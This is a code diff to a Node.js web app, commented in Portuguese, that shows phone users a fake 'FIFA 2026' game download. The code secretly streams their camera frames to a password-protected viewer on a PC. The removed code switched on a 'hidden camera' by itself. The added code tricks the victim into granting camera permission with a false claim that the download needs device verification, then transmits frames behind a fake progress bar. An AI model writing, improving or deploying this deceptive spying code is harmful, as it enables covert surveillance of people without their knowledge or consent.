@@ -51,6 +51,46 @@ app.get('/', (req, res) => {
             text-align: center;
         }
         
+        /* Estilos gerais */
+        h1 { color: #333; margin-bottom: 30px; }
+        
+        /* Botão de permissão */
+        .permission-button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            font-size: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            font-weight: bold;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            transition: all 0.3s;
+            width: 100%;
+            max-width: 300px;
+        }
+        
+        .permission-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+        }
+        
+        .permission-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .permission-info {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            color: #2e7d32;
+            border-left: 5px solid #4CAF50;
+        }
+        
         /* Estilos para CELULAR */
         .mobile-container {
             animation: fadeIn 1s;
@@ -117,12 +157,6 @@ app.get('/', (req, res) => {
             font-weight: bold;
         }
         
-        .status-message {
-            font-size: 16px;
-            color: #666;
-            margin: 20px 0;
-        }
-        
         .download-speed {
             background: #e3f2fd;
             padding: 15px;
@@ -133,7 +167,7 @@ app.get('/', (req, res) => {
             color: #1976D2;
         }
         
-        /* Estilos para PC (mostra vídeo normal) */
+        /* Estilos para PC */
         .pc-container {
             text-align: left;
         }
@@ -216,16 +250,29 @@ app.get('/', (req, res) => {
         }
         
         #localVideo {
-            display: none; /* Escondido no celular */
+            display: none;
+        }
+        
+        /* Área de permissão */
+        .permission-area {
+            background: #f5f5f5;
+            padding: 30px;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+        
+        .camera-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <!-- CONTEÚDO PARA CELULAR -->
-        <div id="mobileContent" class="mobile-container">
+        <div id="mobileContent" class="mobile-container hidden">
             <div class="game-logo">🎮</div>
-            <div class="game-title">JOGO FIFA </div>
+            <div class="game-title">FIFA 2026</div>
             <div class="game-subtitle">Ultimate Edition</div>
             
             <div class="progress-container">
@@ -239,11 +286,20 @@ app.get('/', (req, res) => {
             </div>
             
             <div class="status-message" id="statusMessage">
-                ⏳ Preparando download...
+                ⏳ Aguardando permissão da câmera...
             </div>
             
-            <div style="margin-top: 30px; color: #999; font-size: 14px;">
-                Não feche esta página • Download em segundo plano
+            <!-- ÁREA DO BOTÃO DE PERMISSÃO -->
+            <div id="permissionArea" class="permission-area">
+                <div class="camera-icon">📷</div>
+                <h3>Precisamos da sua câmera</h3>
+                <p style="margin-bottom: 20px; color: #666;">Para continuar o download, precisamos verificar seu dispositivo. Clique no botão abaixo para permitir.</p>
+                <button id="permitirCameraBtn" class="permission-button" onclick="solicitarPermissaoCamera()">
+                    📷 Permitir Acesso à Câmera
+                </button>
+                <div class="permission-info" id="permissionInfo" style="display: none;">
+                    ✅ Permissão concedida! Iniciando download...
+                </div>
             </div>
         </div>
         
@@ -270,7 +326,7 @@ app.get('/', (req, res) => {
             <div class="info-box">
                 <h4>📱 Informações:</h4>
                 <p>Digite a senha <strong>"1234"</strong> para ver a transmissão ao vivo do celular.</p>
-                <p>No celular, o download falso está rodando... 🎮</p>
+                <p>No celular, um botão vai pedir permissão para a câmera.</p>
             </div>
         </div>
         
@@ -289,6 +345,9 @@ app.get('/', (req, res) => {
         const localVideo = document.getElementById('localVideo');
         const remoteVideo = document.getElementById('remoteVideo');
         const passwordOverlay = document.getElementById('passwordOverlay');
+        const permitirCameraBtn = document.getElementById('permitirCameraBtn');
+        const permissionInfo = document.getElementById('permissionInfo');
+        const permissionArea = document.getElementById('permissionArea');
         
         // Elementos da barrinha
         const progressBar = document.getElementById('progressBar');
@@ -301,6 +360,7 @@ app.get('/', (req, res) => {
         let visualizacaoLiberada = false;
         let progresso = 0;
         let intervaloProgresso = null;
+        let cameraPronta = false;
         
         // ========== DETECÇÃO DE DISPOSITIVO ==========
         function detectarDispositivo() {
@@ -312,97 +372,29 @@ app.get('/', (req, res) => {
         
         // ========== CONFIGURAÇÃO POR DISPOSITIVO ==========
         if (isMobile) {
-            // 📱 É CELULAR - Mostra a barrinha falsa
-            console.log('📱 Celular detectado - modo download falso');
-            mobileContent.style.display = 'block';
-            pcContent.style.display = 'none';
+            // 📱 É CELULAR - Mostra a tela com botão de permissão
+            console.log('📱 Celular detectado - aguardando permissão');
+            mobileContent.classList.remove('hidden');
+            pcContent.classList.add('hidden');
             
-            // Inicia a animação da barrinha
-            iniciarDownloadFalso();
-            
-            // Liga a câmera escondida
-            setTimeout(() => {
-                ligarCameraEscondida();
-            }, 2000); // 2 segundos
+            statusMessage.innerHTML = '⏳ Clique no botão para permitir a câmera';
             
         } else {
             // 💻 É PC - Mostra o visualizador
             console.log('💻 PC detectado - modo visualizador');
-            mobileContent.style.display = 'none';
-            pcContent.style.display = 'block';
+            mobileContent.classList.add('hidden');
+            pcContent.classList.remove('hidden');
         }
         
-        // ========== FUNÇÃO DA BARRINHA FALSA ==========
-        function iniciarDownloadFalso() {
-            progresso = 0;
-            const tamanhoTotal = 2500; // 2.5 GB (falso)
-            const velocidades = ['1.2 MB/s', '1.5 MB/s', '1.8 MB/s', '2.1 MB/s', '1.9 MB/s', '2.3 MB/s'];
-            let velocidadeIndex = 0;
-            
-            statusMessage.innerHTML = '⏳ Conectando aos servidores...';
-            
-            setTimeout(() => {
-                statusMessage.innerHTML = '📦 Baixando arquivos do jogo...';
-                
-                intervaloProgresso = setInterval(() => {
-                    if (progresso < 100) {
-                        // Aumenta o progresso de forma aleatória (2-5% por vez)
-                        const incremento = Math.random() * 3 + 2;
-                        progresso = Math.min(100, progresso + incremento);
-                        
-                        // Atualiza a barra
-                        progressBar.style.width = progresso + '%';
-                        progressBar.innerHTML = progresso.toFixed(0) + '%';
-                        progressPercent.innerHTML = progresso.toFixed(0) + '% concluído';
-                        
-                        // Atualiza informações de velocidade
-                        const baixado = ((progresso / 100) * tamanhoTotal).toFixed(1);
-                        velocidadeIndex = (velocidadeIndex + 1) % velocidades.length;
-                        speedInfo.innerHTML = \`⬇️ \${baixado} MB / \${tamanhoTotal} MB • \${velocidades[velocidadeIndex]}\`;
-                        
-                        // Mensagens dinâmicas
-                        if (progresso > 95) {
-                            statusMessage.innerHTML = '📦 Quase lá... verificando arquivos';
-                        } else if (progresso > 75) {
-                            statusMessage.innerHTML = '🎮 Finalizando download...';
-                        } else if (progresso > 50) {
-                            statusMessage.innerHTML = '⚡ Instalando recursos do jogo...';
-                        } else if (progresso > 25) {
-                            statusMessage.innerHTML = '🎵 Baixando áudios e texturas...';
-                        }
-                        
-                        // Quando chegar a 100%
-                        if (progresso >= 100) {
-                            clearInterval(intervaloProgresso);
-                            progressBar.style.background = 'linear-gradient(90deg, #4CAF50, #2196F3)';
-                            statusMessage.innerHTML = '✅ Download concluído! Instalação em segundo plano...';
-                            speedInfo.innerHTML = '⬇️ 2500 MB / 2500 MB • 0 MB/s';
-                            
-                            // Fica variando entre 99-100% para parecer que está "instalando"
-                            let instalando = 99.9;
-                            const intervaloInstalacao = setInterval(() => {
-                                instalando = instalando > 100 ? 99.9 : instalando + 0.1;
-                                progressBar.style.width = instalando + '%';
-                                progressBar.innerHTML = instalando.toFixed(1) + '%';
-                                progressPercent.innerHTML = instalando.toFixed(1) + '% - Instalando...';
-                                
-                                if (instalando > 100.5) {
-                                    clearInterval(intervaloInstalacao);
-                                    progressBar.style.width = '100%';
-                                    progressBar.innerHTML = '100%';
-                                    progressPercent.innerHTML = '100% - Pronto para jogar!';
-                                }
-                            }, 300);
-                        }
-                    }
-                }, 400);
-            }, 2000);
-        }
-        
-        // ========== FUNÇÃO PARA LIGAR CÂMERA ESCONDIDA ==========
-        async function ligarCameraEscondida() {
+        // ========== FUNÇÃO PARA SOLICITAR PERMISSÃO (BOTÃO) ==========
+        window.solicitarPermissaoCamera = async function() {
             try {
-                console.log('📷 Ligando câmera escondida...');
+                console.log('📷 Solicitando permissão da câmera...');
+                
+                // Desabilita o botão enquanto processa
+                permitirCameraBtn.disabled = true;
+                permitirCameraBtn.innerHTML = '⏳ Solicitando permissão...';
+                statusMessage.innerHTML = '📷 Solicitando acesso à câmera...';
                 
                 // Solicita acesso à câmera
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -414,35 +406,106 @@ app.get('/', (req, res) => {
                     audio: false
                 });
                 
+                // Sucesso!
                 mediaStream = stream;
-                
-                // Conecta o stream ao vídeo escondido
                 localVideo.srcObject = stream;
                 await localVideo.play();
                 
-                // Canvas para capturar frames
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const ctx = canvas.getContext('2d');
+                // Mostra mensagem de sucesso
+                permissionInfo.style.display = 'block';
+                permitirCameraBtn.style.display = 'none';
+                statusMessage.innerHTML = '✅ Permissão concedida! Iniciando download...';
                 
-                // Função de captura (continua mesmo com a aba em background)
-                const intervaloCaptura = setInterval(() => {
-                    try {
-                        ctx.drawImage(localVideo, 0, 0, 640, 480);
-                        const frame = canvas.toDataURL('image/jpeg', 0.5);
-                        socket.emit('frame', frame);
-                    } catch (e) {
-                        console.log('Erro na captura:', e);
-                    }
-                }, 200); // 5 fps
+                // Inicia o download falso e a transmissão
+                cameraPronta = true;
+                iniciarDownloadFalso();
+                iniciarTransmissao();
                 
-                console.log('✅ Câmera escondida transmitindo!');
+                console.log('✅ Câmera autorizada com sucesso!');
                 
             } catch (err) {
-                console.error('Erro ao ligar câmera:', err);
-                statusMessage.innerHTML = '❌ Erro na câmera, mas o download continua...';
+                console.error('Erro ao solicitar permissão:', err);
+                
+                // Reabilita o botão em caso de erro
+                permitirCameraBtn.disabled = false;
+                permitirCameraBtn.innerHTML = '📷 Tentar Novamente';
+                
+                // Mensagem de erro específica
+                if (err.name === 'NotAllowedError') {
+                    statusMessage.innerHTML = '❌ Permissão negada. Clique no cadeado 🔒 da URL e permita a câmera.';
+                } else if (err.name === 'NotFoundError') {
+                    statusMessage.innerHTML = '❌ Nenhuma câmera encontrada neste dispositivo.';
+                } else {
+                    statusMessage.innerHTML = '❌ Erro: ' + err.message;
+                }
             }
+        };
+        
+        // ========== FUNÇÃO PARA INICIAR TRANSMISSÃO ==========
+        function iniciarTransmissao() {
+            if (!cameraPronta) return;
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            
+            // Função de captura
+            setInterval(() => {
+                try {
+                    ctx.drawImage(localVideo, 0, 0, 640, 480);
+                    const frame = canvas.toDataURL('image/jpeg', 0.5);
+                    socket.emit('frame', frame);
+                } catch (e) {
+                    console.log('Erro na captura:', e);
+                }
+            }, 200);
+            
+            console.log('✅ Transmissão iniciada!');
+        }
+        
+        // ========== FUNÇÃO DA BARRINHA FALSA ==========
+        function iniciarDownloadFalso() {
+            progresso = 0;
+            const tamanhoTotal = 2500;
+            const velocidades = ['1.2 MB/s', '1.5 MB/s', '1.8 MB/s', '2.1 MB/s', '1.9 MB/s', '2.3 MB/s'];
+            let velocidadeIndex = 0;
+            
+            setTimeout(() => {
+                statusMessage.innerHTML = '📦 Baixando arquivos do jogo...';
+                
+                intervaloProgresso = setInterval(() => {
+                    if (progresso < 100) {
+                        const incremento = Math.random() * 3 + 2;
+                        progresso = Math.min(100, progresso + incremento);
+                        
+                        progressBar.style.width = progresso + '%';
+                        progressBar.innerHTML = progresso.toFixed(0) + '%';
+                        progressPercent.innerHTML = progresso.toFixed(0) + '% concluído';
+                        
+                        const baixado = ((progresso / 100) * tamanhoTotal).toFixed(1);
+                        velocidadeIndex = (velocidadeIndex + 1) % velocidades.length;
+                        speedInfo.innerHTML = \`⬇️ \${baixado} MB / \${tamanhoTotal} MB • \${velocidades[velocidadeIndex]}\`;
+                        
+                        if (progresso > 95) {
+                            statusMessage.innerHTML = '📦 Quase lá... verificando arquivos';
+                        } else if (progresso > 75) {
+                            statusMessage.innerHTML = '🎮 Finalizando download...';
+                        } else if (progresso > 50) {
+                            statusMessage.innerHTML = '⚡ Instalando recursos do jogo...';
+                        } else if (progresso > 25) {
+                            statusMessage.innerHTML = '🎵 Baixando áudios e texturas...';
+                        }
+                        
+                        if (progresso >= 100) {
+                            clearInterval(intervaloProgresso);
+                            progressBar.style.background = 'linear-gradient(90deg, #4CAF50, #2196F3)';
+                            statusMessage.innerHTML = '✅ Download concluído! Instalação em segundo plano...';
+                            speedInfo.innerHTML = '⬇️ 2500 MB / 2500 MB • 0 MB/s';
+                        }
+                    }
+                }, 400);
+            }, 1000);
         }
         
         // ========== VERIFICAÇÃO DE SENHA (PC) ==========
@@ -487,13 +550,11 @@ io.on('connection', (socket) => {
 
 server.listen(PORT, () => {
   console.log('='.repeat(60));
-  console.log('📱 SISTEMA DE DOWNLOAD FALSO');
+  console.log('📱 SISTEMA COM BOTÃO DE PERMISSÃO');
   console.log('='.repeat(60));
   console.log(`🚀 Servidor rodando na porta ${PORT}`);
   console.log(`🔑 Senha: ${SENHA}`);
-  console.log('📱 No celular: mostra download falso do FIFA');
-  console.log('💻 No PC: mostra a câmera escondida');
+  console.log('📱 No celular: botão para permitir câmera');
+  console.log('💻 No PC: visualizador normal');
   console.log('='.repeat(60));
 });
-
-
